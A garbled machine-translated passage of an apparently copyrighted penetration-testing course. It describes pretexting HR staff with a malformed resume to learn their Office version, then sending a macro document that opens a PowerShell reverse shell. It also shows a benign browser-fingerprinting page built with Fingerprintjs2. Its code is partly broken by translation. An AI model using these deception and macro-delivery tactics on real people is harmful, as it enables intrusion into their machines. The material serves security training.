<div style="position:absolute;top:110531;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">333 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（维基百科，2019 年），https:</font></font><font style="vertical-align: inherit;"> //en.wikipedia.org/wiki/Social_engineering_ </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（安全）</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:110659;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="94"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 94 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:110692;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:111769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:111769;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:111769;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">414</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:110788;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">想象一下下面的场景。</font><font style="vertical-align: inherit;">我们正在参与，试图执行客户端攻击</font></font></nobr></div>
<div style="position:absolute;top:110807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反对人力资源 (HR) 部门。</font><font style="vertical-align: inherit;">我们可以盲目地跳进去攻击，但是我们的</font></font></nobr></div>
<div style="position:absolute;top:110826;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功的机会很小，因为我们不知道它们是什么操作系统和应用程序</font></font></nobr></div>
<div style="position:absolute;top:110846;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正在使用，也不知道是哪个版本。</font><font style="vertical-align: inherit;">相反，我们会倾向于谨慎并以</font></font></nobr></div>
<div style="position:absolute;top:110865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设计为无法打开的格式错误的“简历”文档。</font><font style="vertical-align: inherit;">我们用这样的方式来写电子邮件</font></font></nobr></div>
<div style="position:absolute;top:110885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">吸引某种回应。</font></font></nobr></div>
<div style="position:absolute;top:110917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第二天，我们收到一封电子邮件回复，表示毫不奇怪，HR 无法打开我们的</font></font></nobr></div>
<div style="position:absolute;top:110936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文档。</font><font style="vertical-align: inherit;">为了帮助解决问题，我们会做出回应（如果可能，希望通过电话）</font></font></nobr></div>
<div style="position:absolute;top:110956;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">询问他们正在使用的 Microsoft Office 的确切版本，并提供可能导致的问题</font></font></nobr></div>
<div style="position:absolute;top:110975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于版本不兼容。</font><font style="vertical-align: inherit;">这种类型的对话可以通过询问安全功能来继续</font></font></nobr></div>
<div style="position:absolute;top:110994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能在 Office 中启用，或正在使用的操作系统版本。</font><font style="vertical-align: inherit;">这种类型的对话框</font></font></nobr></div>
<div style="position:absolute;top:111014;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">必须平衡、低调，并充斥着证明问题合理性的评论，例如，“</font></font></nobr></div>
<div style="position:absolute;top:111033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">简历利用宏等高级功能来帮助使其脱颖而出并使</font></font></nobr></div>
<div style="position:absolute;top:111053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内容易于浏览”。</font><font style="vertical-align: inherit;">虽然确切的过程超出了本模块的范围，但这个</font></font></nobr></div>
<div style="position:absolute;top:111072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实践被称为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">借口</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">334</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，可以大大提高我们成功的机会。</font></font></nobr></div>
<div style="position:absolute;top:111105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的场景中，我们发现 HR 代表毫不奇怪地使用特定版本的</font></font></nobr></div>
<div style="position:absolute;top:111124;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Office 并允许他们执行 Word 宏。</font><font style="vertical-align: inherit;">有了这些信息，</font></font></nobr></div>
<div style="position:absolute;top:111143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以制作第二份简历 Word 文档，其中包含一个利用 PowerShell 打开的宏</font></font></nobr></div>
<div style="position:absolute;top:111163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个反向外壳并将其通过电子邮件发送给他们。</font></font></nobr></div>
<div style="position:absolute;top:111196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当然，这是一个简化的成功故事。</font><font style="vertical-align: inherit;">你的社会工程学借口肯定会</font></font></nobr></div>
<div style="position:absolute;top:111215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据您事先收集的信息，必须更加复杂和具体。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:111249;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.1.2.2 客户端指纹识别</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:111284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端指纹</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">335</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的过程对</font><font style="vertical-align: inherit;">我们的攻击成功至关重要，但要获得</font></font></nobr></div>
<div style="position:absolute;top:111303;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最精确的信息，我们必须经常从目标机器本身收集。</font><font style="vertical-align: inherit;">我们可以</font></font></nobr></div>
<div style="position:absolute;top:111322;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将攻击的这一重要阶段作为利用过程之前的独立步骤执行，或者</font></font></nobr></div>
<div style="position:absolute;top:111342;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将指纹识别纳入漏洞利用本身的第一阶段。</font></font></nobr></div>
<div style="position:absolute;top:111375;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们假设我们已经说服我们的受害者在一个实际例子中访问我们的恶意网页。</font></font></nobr></div>
<div style="position:absolute;top:111394;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的目标是识别受害者的网络浏览器版本和有关底层</font></font></nobr></div>
<div style="position:absolute;top:111413;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:111475;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web 浏览器通常是收集有关</font></font></i></nobr></div>
<div style="position:absolute;top:111495;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标。</font><font style="vertical-align: inherit;">它们的演变、复杂性和丰富的功能已经成为</font></font></i></nobr></div>
<div style="position:absolute;top:111514;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对最终用户和攻击者都是双刃剑。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:111576;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以创建自己的自定义工具，但有许多可用的开源指纹识别</font></font></nobr></div>
<div style="position:absolute;top:111596;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">项目，最可靠的通常是那些直接利用公共客户端的项目</font></font></nobr></div>
<div style="position:absolute;top:111615;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JavaScript 等组件。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:111699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">334 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（维基百科，2019 年），https:</font></font><font style="vertical-align: inherit;"> //en.wikipedia.org/wiki/Social_engineering_ </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(security)#Pretexting</font></font></font></nobr></div>
<div style="position:absolute;top:111719;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">335 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Device_fingerprint</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:111847;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="95"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 95 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:111880;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:112957;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:112957;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:112957;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">415</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:111976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于这个例子，我们将使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Fingerprintjs2</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> JavaScript 库，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">336</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，可以通过以下方式安装</font></font></nobr></div>
<div style="position:absolute;top:111995;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从其 GitHub 存储库下载并提取项目档案：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:112030;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/var/www/html$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo wget https://github.com/Valve/fingerprintjs2/archive/mas</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:112047;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">压缩包</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:112064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--2019-07-24 02:42:36-- https://github.com/Valve/fingerprintjs2/archive/master.zip</font></font></nobr></div>
<div style="position:absolute;top:112081;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...  </font></font></nobr></div>
<div style="position:absolute;top:112115;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2019-07-24 02:42:41 (116 KB/s) - 'master.zip' 已保存 [99698]</font></font></nobr></div>
<div style="position:absolute;top:112149;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/var/www/html$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo unzip master.zip</font></font></font></b></nobr></div>
<div style="position:absolute;top:112166;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存档：master.zip</font></font></nobr></div>
<div style="position:absolute;top:112183;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eb44f8f6f5a8c4c0ae476d4c60d8ed1015b2b605</font></font></nobr></div>
<div style="position:absolute;top:112200;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建：fingerprintjs2-master/</font></font></nobr></div>
<div style="position:absolute;top:112217;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">充气：fingerprintjs2-master/.eslintrc  </font></font></nobr></div>
<div style="position:absolute;top:112234;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:112251;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/var/www/html$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo mv指纹js2-master/ fp</font></font></font></b></nobr></div>
<div style="position:absolute;top:112270;left:313"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 379 - 下载 Fingerprintjs2 库</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:112299;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以根据项目中包含的示例将这个库合并到一个 HTML 文件中。</font></font></nobr></div>
<div style="position:absolute;top:112319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将从位于</font></font></nobr></div>
<div style="position:absolute;top:112338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们 Kali Web 服务器的 /var/www/html/fp 目录：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:112373;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/var/www/html/fp$</font><b><font color="#0070c0"><font style="vertical-align: inherit;">猫指纹</font></font></b><font style="vertical-align: inherit;">2.html</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
<div style="position:absolute;top:112390;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;!doctype html&gt;</font></font></nobr></div>
<div style="position:absolute;top:112407;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;html&gt;</font></font></nobr></div>
<div style="position:absolute;top:112424;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;头&gt;</font></font></nobr></div>
<div style="position:absolute;top:112441;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;title&gt;Fingerprintjs2 测试&lt;/title&gt;</font></font></nobr></div>
<div style="position:absolute;top:112458;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/头&gt;</font></font></nobr></div>
<div style="position:absolute;top:112475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;身体&gt;</font></font></nobr></div>
<div style="position:absolute;top:112492;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;h1&gt;指纹js2&lt;/h1&gt;</font></font></nobr></div>
<div style="position:absolute;top:112526;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;p&gt;您的浏览器指纹：&lt;strong id="fp"&gt;&lt;/strong&gt;&lt;/p&gt;</font></font></nobr></div>
<div style="position:absolute;top:112543;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;p&gt;&lt;code id="time"/&gt;&lt;/p&gt;</font></font></nobr></div>
<div style="position:absolute;top:112559;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;p&gt;&lt;span id="details"/&gt;&lt;/p&gt;</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:112576;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;script src="fingerprint2.js"&gt;&lt;/script&gt;</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:112594;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;脚本&gt;</font></font></nobr></div>
<div style="position:absolute;top:112611;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var d1 = 新日期();</font></font></nobr></div>
<div style="position:absolute;top:112627;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var 选项 = {};</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:112644;left:157"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Fingerprint2.get(options, function (components) </font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></font></nobr></div>
<div style="position:absolute;top:112661;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var values = components.map(function (component) { return component.value })</font></font></b></nobr></div>
<div style="position:absolute;top:112678;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var murmur = Fingerprint2.x64hash128(values.join(''), 31)</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:112695;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var d2 = 新日期();</font></font></nobr></div>
<div style="position:absolute;top:112712;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var timeString = "指纹计算时间：" + (d2 - d1) + "ms";</font></font></nobr></div>
<div style="position:absolute;top:112729;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var details = "&lt;strong&gt;详细信息：&lt;/strong&gt;&lt;br /&gt;";</font></font></nobr></div>
<div style="position:absolute;top:112746;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">if(typeof window.console !== "undefined") {</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:112763;left:190"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">for（组件中的var索引）{</font></font></b></nobr></div>
<div style="position:absolute;top:112780;left:206"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var obj = 组件[索引];</font></font></b></nobr></div>
<div style="position:absolute;top:112797;left:206"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var 值 = obj.value;</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:112814;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果（值！== 空）{</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:112831;left:222"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var line = obj.key + " = " + value.toString().substr(0, 150);</font></font></b></nobr></div>
<div style="position:absolute;top:112848;left:222"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">详情 += 行 + "&lt;br /&gt;";</font></font></b></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:112907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">336 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（阀门，2019），https://github.com/Valve/fingerprintjs2</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:113035;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="96"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 96 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:113068;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:114145;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:114145;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:114145;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">416</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:113164;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:113180;left:190"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:113197;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:113214;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">document.querySelector("#details").innerHTML = 详细信息</font></font></b></nobr></div>
<div style="position:absolute;top:113232;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">document.querySelector("#fp").textContent = murmur</font></font></b></nobr></div>
<div style="position:absolute;top:113248;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">document.querySelector("#time").textContent = timeString</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:113265;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">});</font></font></nobr></div>
<div style="position:absolute;top:113282;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/脚本&gt;</font></font></nobr></div>
<div style="position:absolute;top:113299;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/正文&gt;</font></font></nobr></div>
<div style="position:absolute;top:113316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/html&gt;</font></font></nobr></div>
<div style="position:absolute;top:113336;left:302"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 380 - 使用 Fingerprintjs2 JavaScript 库</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:113365;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 380 中的 JavaScript 代码调用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Fingerprint2.get</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">静态函数来启动</font></font></nobr></div>
<div style="position:absolute;top:113384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指纹识别过程。</font><font style="vertical-align: inherit;">库返回</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">components</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量是一个包含所有的数组</font></font></nobr></div>
<div style="position:absolute;top:113404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从客户端提取的信息。</font><font style="vertical-align: inherit;">存储在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">components</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数组中</font><font style="vertical-align: inherit;">的值</font><font style="vertical-align: inherit;">被传递给</font></font></nobr></div>
<div style="position:absolute;top:113423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杂音</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">337</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了哈希函数来创建浏览器的哈希指纹。</font><font style="vertical-align: inherit;">最后，同样的</font></font></nobr></div>
<div style="position:absolute;top:113442;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值被提取并显示在 HTML 页面中。</font></font></nobr></div>
<div style="position:absolute;top:113475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自我们的 Windows 实验室机器的上述网页（图 240）显示了几行</font></font></nobr></div>
<div style="position:absolute;top:113495;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JavaScript 代码提取浏览器用户代理字符串、其本地化、已安装的浏览器</font></font></nobr></div>
<div style="position:absolute;top:113514;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">插件和相关版本，关于底层 Win32 操作系统的一般信息</font></font></nobr></div>
<div style="position:absolute;top:113533;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">平台和其他详细信息：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:114095;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">337 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/MurmurHash</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:114223;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="97"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 97 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:114256;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:115333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:115333;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:115333;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">417</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:114799;left:227"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 240：通过 JavaScript Fingerprintjs2 库对浏览器进行指纹识别</font></font></i></nobr></div>
<div style="position:absolute;top:114831;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029。</font></font></nobr></div>
<div style="position:absolute;top:114849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">110 Safari/537 边缘/16.16299</font></font></nobr></div>
<div style="position:absolute;top:114868;left:233"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 381 - 由 JavaScript 脚本提取的完整用户代理字符串</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:114897;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以将此用户代理字符串提交到在线用户代理数据库以识别浏览器</font></font></nobr></div>
<div style="position:absolute;top:114917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版本和操作系统，如图 241 所示。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:115411;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="98"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 98 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:115444;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
